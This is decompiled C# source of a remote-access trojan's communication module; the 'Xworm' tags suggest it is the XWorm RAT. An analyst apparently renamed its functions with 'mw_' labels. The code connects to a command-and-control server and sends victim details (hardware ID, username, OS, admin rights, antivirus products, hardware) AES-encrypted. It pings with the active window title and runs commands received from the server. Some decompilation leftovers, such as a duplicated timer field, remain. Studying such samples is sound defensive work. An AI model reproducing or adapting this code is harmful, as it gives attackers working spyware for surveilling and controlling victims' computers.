using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub
{
	// Token: 0x02000009 RID: 9
	public class mw_Utils
	{
		// Token: 0x06000051 RID: 81
		public static void mw_testC2Connection()
		{
			try
			{
				string text = mw_config.mw_IPAddress.Split(new char[]
				{
					','
				})[new Random().Next(mw_config.mw_IPAddress.Split(new char[]
				{
					','
				}).Length)];
				if (mw_Handler.mw_isValidHostname(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress ipaddress in hostAddresses)
					{
						try
						{
							mw_Utils.dRR21g0pHl1zrM46lVKUkT9M(ipaddress.ToString());
							if (mw_Utils.mw_hasSocketAsyncCallSucceeded)
							{
								break;
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				else
				{
					mw_Utils.dRR21g0pHl1zrM46lVKUkT9M(text);
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00002FC4 File Offset: 0x000011C4
		public static object dRR21g0pHl1zrM46lVKUkT9M(string SnWwUCSGb5CwQPNw3fbamQnl)
		{
			try
			{
				mw_Utils.mw_socket = new Socket(2, SocketType.Stream, ProtocolType.Tcp);
				mw_Utils.mw_expectedPayloadSize = -1L;
				mw_Utils.mw_buffer = new byte[1];
				mw_Utils.mw_memStream = new MemoryStream();
				mw_Utils.mw_socket.ReceiveBufferSize = 51200;
				mw_Utils.mw_socket.SendBufferSize = 51200;
				mw_Utils.mw_socket.Connect(SnWwUCSGb5CwQPNw3fbamQnl, Conversions.ToInteger(mw_config.mw_socketPort));
				mw_config.mw_currentC2IP = SnWwUCSGb5CwQPNw3fbamQnl;
				mw_Utils.mw_hasSocketAsyncCallSucceeded = true;
				mw_Utils.mw_syncLockObject = RuntimeHelpers.GetObjectValue(new object());
				mw_Utils.mw_sendDataOverSocket(Conversions.ToString(mw_Utils.mw_gatherVictimInfo()));
				mw_Utils.mw_isAwaitingPong = false;
				mw_Utils.mw_socket.BeginReceive(mw_Utils.mw_buffer, 0, mw_Utils.mw_buffer.Length, SocketFlags.None, new AsyncCallback(mw_Utils.is_C2Listener), null);
				TimerCallback callback = new TimerCallback(mw_Utils.mw_sendPing);
				mw_Utils.mw_timer = new Timer(callback, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				mw_Utils.mw_timer = new Timer(new TimerCallback(mw_Utils.mw_trackTimeSinceLastC2Conn), null, 1, 1);
			}
			catch (Exception ex)
			{
				mw_Utils.mw_hasSocketAsyncCallSucceeded = false;
			}
			finally
			{
				mw_Utils.mw_manualResetEvent.Set();
			}
			object result;
			return result;
		}

		// Token: 0x06000053 RID: 83
		public static object mw_gatherVictimInfo()
		{
			ComputerInfo computerInfo = new ComputerInfo();
			return string.Concat(new object[]
			{
				"INFO",
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Handler.mw_getHWID(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				Environment.UserName,
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				computerInfo.OSFullName.Replace("Microsoft", null),
				Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ",
				Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_config.mw_malwareName,
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_getLastMalwareUpdate(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_isInfectedViaUSB(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_checkIfCurrentUserIsAdmin(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Communications.mw_isVideoCapCapable(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_getCPUInfo(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_getGPUInfo(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_memorySizeToGBorMB(),
				RuntimeHelpers.GetObjectValue(mw_Utils.mw_XwormTag),
				mw_Utils.mw_getAvInfo()
			});
		}

		// Token: 0x06000054 RID: 84
		public static string mw_getLastMalwareUpdate()
		{
			string result;
			try
			{
				FileInfo fileInfo = new FileInfo(mw_Handler.mw_currentProcessFilename);
				result = fileInfo.LastWriteTime.ToString("dd/MM/yyy");
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x06000055 RID: 85
		public static string mw_isInfectedViaUSB()
		{
			string result;
			try
			{
				if (Operators.CompareString(Path.GetFileName(mw_Handler.mw_currentProcessFilename), mw_config.mw_driveInfectionFilename, false) == 0)
				{
					result = "True";
				}
				else
				{
					result = "False";
				}
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003398 File Offset: 0x00001598
		public static string mw_checkIfCurrentUserIsAdmin()
		{
			string result;
			try
			{
				result = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString();
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x000033F4 File Offset: 0x000015F4
		public static string mw_getAvInfo()
		{
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					StringBuilder stringBuilder = new StringBuilder();
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							stringBuilder.Append(managementBaseObject["displayName"].ToString());
							stringBuilder.Append(",");
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((IDisposable)enumerator).Dispose();
						}
					}
					if (stringBuilder.ToString().Length == 0)
					{
						result = "None";
					}
					else
					{
						result = stringBuilder.ToString().Substring(0, checked(stringBuilder.Length - 1));
					}
				}
			}
			catch (Exception ex)
			{
				result = "None";
			}
			return result;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000034F8 File Offset: 0x000016F8
		public static string mw_getGPUInfo()
		{
			string result;
			try
			{
				string text = string.Empty;
				ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_VideoController");
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(query);
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(text, managementObject["Name"]), " "));
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				result = text;
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000035B0 File Offset: 0x000017B0
		public static string mw_getCPUInfo()
		{
			string result;
			try
			{
				ManagementObject managementObject = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
				managementObject.Get();
				result = managementObject["Name"].ToString().Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "");
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003650 File Offset: 0x00001850
		public static string mw_memorySizeToGBorMB()
		{
			checked
			{
				string result;
				try
				{
					string text = null;
					long num = (long)Math.Round(Conversion.Val(Template.Computer.Info.TotalPhysicalMemory));
					if (num > 1073741824L)
					{
						text = ((double)num / 1073741824.0).ToString();
						text = text.Remove(4, text.Length - 4) + " GB";
					}
					else if (num > 1048576L)
					{
						text = ((double)num / 1048576.0).ToString();
						text = text.Remove(4, text.Length - 4) + " MB";
					}
					result = text;
				}
				catch (Exception ex)
				{
					result = "Error";
				}
				return result;
			}
		}

		// Token: 0x0600005B RID: 91
		public static void is_C2Listener(IAsyncResult 3aQ62PP4DRoIV2RUlRYRjOKT)
		{
			checked
			{
				if (mw_Utils.mw_hasSocketAsyncCallSucceeded)
				{
					try
					{
						int num = mw_Utils.mw_socket.EndReceive(3aQ62PP4DRoIV2RUlRYRjOKT);
						if (num > 0)
						{
							if (mw_Utils.mw_expectedPayloadSize == -1L)
							{
								if (mw_Utils.mw_buffer[0] == 0)
								{
									mw_Utils.mw_expectedPayloadSize = Conversions.ToLong(mw_Handler.mw_convertByteArrayToString(mw_Utils.mw_memStream.ToArray()));
									mw_Utils.mw_memStream.Dispose();
									mw_Utils.mw_memStream = new MemoryStream();
									if (mw_Utils.mw_expectedPayloadSize == 0L)
									{
										mw_Utils.mw_expectedPayloadSize = -1L;
										mw_Utils.mw_socket.BeginReceive(mw_Utils.mw_buffer, 0, mw_Utils.mw_buffer.Length, SocketFlags.None, new AsyncCallback(mw_Utils.is_C2Listener), mw_Utils.mw_socket);
										return;
									}
									mw_Utils.mw_buffer = new byte[(int)(mw_Utils.mw_expectedPayloadSize - 1L) + 1];
								}
								else
								{
									mw_Utils.mw_memStream.WriteByte(mw_Utils.mw_buffer[0]);
								}
							}
							else
							{
								mw_Utils.mw_memStream.Write(mw_Utils.mw_buffer, 0, num);
								if (mw_Utils.mw_memStream.Length == mw_Utils.mw_expectedPayloadSize)
								{
									object instance = new Thread(new ParameterizedThreadStart(mw_Utils.mw_executeC2Command));
									NewLateBinding.LateCall(instance, null, "Start", new object[]
									{
										mw_Utils.mw_memStream.ToArray()
									}, null, null, null, true);
									mw_Utils.mw_expectedPayloadSize = -1L;
									mw_Utils.mw_memStream.Dispose();
									mw_Utils.mw_memStream = new MemoryStream();
									mw_Utils.mw_buffer = new byte[1];
								}
								else
								{
									mw_Utils.mw_buffer = new byte[(int)(mw_Utils.mw_expectedPayloadSize - mw_Utils.mw_memStream.Length - 1L) + 1];
								}
							}
							mw_Utils.mw_socket.BeginReceive(mw_Utils.mw_buffer, 0, mw_Utils.mw_buffer.Length, SocketFlags.None, new AsyncCallback(mw_Utils.is_C2Listener), mw_Utils.mw_socket);
						}
						else
						{
							mw_Utils.mw_hasSocketAsyncCallSucceeded = false;
						}
					}
					catch (Exception ex)
					{
						mw_Utils.mw_hasSocketAsyncCallSucceeded = false;
					}
				}
			}
		}

		// Token: 0x0600005C RID: 92
		public static void mw_executeC2Command(byte[] GrOA7zzJfGylrLSIiSVeucJY)
		{
			try
			{
				mw_Communications.mw_executeC2Command(GrOA7zzJfGylrLSIiSVeucJY);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600005D RID: 93
		public static void mw_sendDataOverSocket(string value)
		{
			object obj = mw_Utils.mw_syncLockObject;
			ObjectFlowControl.CheckForSyncLockOnValueType(obj);
			lock (obj)
			{
				if (mw_Utils.mw_hasSocketAsyncCallSucceeded)
				{
					try
					{
						using (MemoryStream memoryStream = new MemoryStream())
						{
							byte[] array = mw_Handler.mw_encryptByteArrayToAES(mw_Handler.mw_stringToBytes(value));
							byte[] array2 = mw_Handler.mw_stringToBytes(Conversions.ToString(array.Length) + "\0");
							memoryStream.Write(array2, 0, array2.Length);
							memoryStream.Write(array, 0, array.Length);
							mw_Utils.mw_socket.Poll(-1, SelectMode.SelectWrite);
							mw_Utils.mw_socket.BeginSend(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None, new AsyncCallback(mw_Utils.mw_abortAsyncSocketCall), null);
						}
					}
					catch (Exception ex)
					{
						mw_Utils.mw_hasSocketAsyncCallSucceeded = false;
					}
				}
			}
		}

		// Token: 0x0600005E RID: 94
		public static void mw_abortAsyncSocketCall(IAsyncResult JozWZuB6O2GNiapsbBJeucdd)
		{
			try
			{
				mw_Utils.mw_socket.EndSend(JozWZuB6O2GNiapsbBJeucdd);
			}
			catch (Exception ex)
			{
				mw_Utils.mw_hasSocketAsyncCallSucceeded = false;
			}
		}

		// Token: 0x0600005F RID: 95
		public static void mw_cleanup()
		{
			if (mw_Utils.mw_timer != null)
			{
				try
				{
					mw_Utils.mw_timer.Dispose();
					mw_Utils.mw_timer = null;
				}
				catch (Exception ex)
				{
				}
			}
			if (mw_Utils.mw_timer != null)
			{
				try
				{
					mw_Utils.mw_timer.Dispose();
					mw_Utils.mw_timer = null;
				}
				catch (Exception ex2)
				{
				}
			}
			if (mw_Utils.mw_memStream != null)
			{
				try
				{
					mw_Utils.mw_memStream.Close();
					mw_Utils.mw_memStream.Dispose();
					mw_Utils.mw_memStream = null;
				}
				catch (Exception ex3)
				{
				}
			}
			if (mw_Utils.mw_socket != null)
			{
				try
				{
					mw_Utils.mw_socket.Close();
					mw_Utils.mw_socket.Dispose();
					mw_Utils.mw_socket = null;
				}
				catch (Exception ex4)
				{
				}
			}
			GC.Collect();
		}

		// Token: 0x06000060 RID: 96
		public static void mw_trackTimeSinceLastC2Conn(object lhsNDzjEYR2PC9dKPHUY4tup)
		{
			checked
			{
				try
				{
					if (mw_Utils.mw_isAwaitingPong && mw_Utils.mw_hasSocketAsyncCallSucceeded)
					{
						mw_Utils.mw_timeSinceLastConn++;
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000061 RID: 97
		public static void mw_sendPingOverXChat()
		{
			try
			{
				if (mw_Utils.mw_hasSocketAsyncCallSucceeded)
				{
					mw_Utils.mw_sendDataOverSocket(string.Concat(new string[]
					{
						"PING!",
						mw_config.mw_XwormTag,
						mw_Handler.mw_getWindowText(),
						mw_config.mw_XwormTag,
						mw_Handler.mw_str
					}));
					mw_Utils.mw_isAwaitingPong = true;
					GC.Collect();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000062 RID: 98
		[DebuggerStepThrough]
		[CompilerGenerated]
		private static void mw_sendPing(object vmXpijzH14eaYoP4Q4D7YynH)
		{
			mw_Utils.mw_sendPingOverXChat();
		}

		// Token: 0x06000063 RID: 99
		[CompilerGenerated]
		[DebuggerStepThrough]
		private static void mw_executeC2Command(object WmRDz0P5tv5w2tgtac7VgDyk)
		{
			mw_Utils.mw_executeC2Command((byte[])WmRDz0P5tv5w2tgtac7VgDyk);
		}

		// Token: 0x04000012 RID: 18
		public static bool mw_hasSocketAsyncCallSucceeded = false;

		// Token: 0x04000013 RID: 19
		public static Socket mw_socket = null;

		// Token: 0x04000014 RID: 20
		private static long mw_expectedPayloadSize = 0L;

		// Token: 0x04000015 RID: 21
		private static byte[] mw_buffer;

		// Token: 0x04000016 RID: 22
		private static MemoryStream mw_memStream = null;

		// Token: 0x04000017 RID: 23
		private static Timer mw_timer = null;

		// Token: 0x04000018 RID: 24
		public static ManualResetEvent mw_manualResetEvent = new ManualResetEvent(false);

		// Token: 0x04000019 RID: 25
		private static object mw_syncLockObject = null;

		// Token: 0x0400001A RID: 26
		public static readonly object mw_XwormTag = mw_config.mw_XwormTag;

		// Token: 0x0400001B RID: 27
		public static Timer mw_timer;

		// Token: 0x0400001C RID: 28
		public static int mw_timeSinceLastConn;

		// Token: 0x0400001D RID: 29
		public static bool mw_isAwaitingPong;
	}
}
